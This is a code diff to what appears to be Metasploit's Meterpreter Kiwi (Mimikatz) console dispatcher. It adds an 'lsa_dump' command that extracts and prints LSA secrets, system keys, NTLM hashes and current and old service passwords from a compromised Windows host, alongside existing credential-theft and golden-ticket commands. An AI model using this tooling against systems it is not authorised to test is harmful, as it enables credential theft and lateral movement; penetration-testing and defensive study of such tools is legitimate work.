@@ -45,7 +45,8 @@ class Console::CommandDispatcher::Kiwi
       "creds_kerberos"       => "Attempt to retrieve Kerberos creds",
       "creds_all"            => "Attempt to retrieve all credentials",
       "golden_ticket_create" => "Attempt to create a golden kerberos ticket",
-      "golden_ticket_use"    => "Attempt to use a golden kerberos ticket"
+      "golden_ticket_use"    => "Attempt to use a golden kerberos ticket",
+      "lsa_dump"             => "Attempt to dump LSA secrets"
     }
   end
 
@@ -77,6 +78,45 @@ class Console::CommandDispatcher::Kiwi
 
     print_line table.to_s
     return true
+  end
+
+  def cmd_lsa_dump(*args)
+    get_privs
+
+    print_status("Dumping LSA secrets")
+    lsa = client.kiwi.lsa_dump
+
+    # the format of this data doesn't really lend itself nicely to
+    # use within a table so instead we'll dump in a linear fashion
+
+    print_line("Policy Subsystem : #{lsa[:major]}.#{lsa[:minor]}") if lsa[:major]
+    print_line("Domain/Computer  : #{lsa[:compname]}") if lsa[:compname]
+    print_line("System Key       : #{lsa[:syskey]}") if lsa[:syskey]
+    print_line("NT5 Key          : #{lsa[:nt5key]}") if lsa[:nt5key]
+    print_line
+    print_line("NT6 Key Count    : #{lsa[:nt6keys].length}")
+
+    if lsa[:nt6keys].length > 0
+      print_line
+      lsa[:nt6keys].to_enum.with_index(1) do |k, i|
+        print_line("#{i.to_s.rjust(2, ' ')}. ID           : #{k[:id]}")
+        print_line("#{i.to_s.rjust(2, ' ')}. Value        : #{k[:value]}")
+      end
+    end
+
+    print_line
+    print_line("Secret Count     : #{lsa[:secrets].length}")
+    if lsa[:secrets].length > 0
+      lsa[:secrets].to_enum.with_index(1) do |s, i|
+      print_line
+        print_line("#{i.to_s.rjust(2, ' ')}. Name         : #{s[:name]}")
+        print_line("#{i.to_s.rjust(2, ' ')}. Service      : #{s[:service]}") if s[:service]
+        print_line("#{i.to_s.rjust(2, ' ')}. NTLM         : #{s[:ntlm]}") if s[:ntlm]
+        print_line("#{i.to_s.rjust(2, ' ')}. Current      : #{s[:current]}") if s[:current]
+        print_line("#{i.to_s.rjust(2, ' ')}. Old          : #{s[:old]}") if s[:old]
+      end
+    end
+    print_line
   end
 
   def cmd_golden_ticket_create(*args)
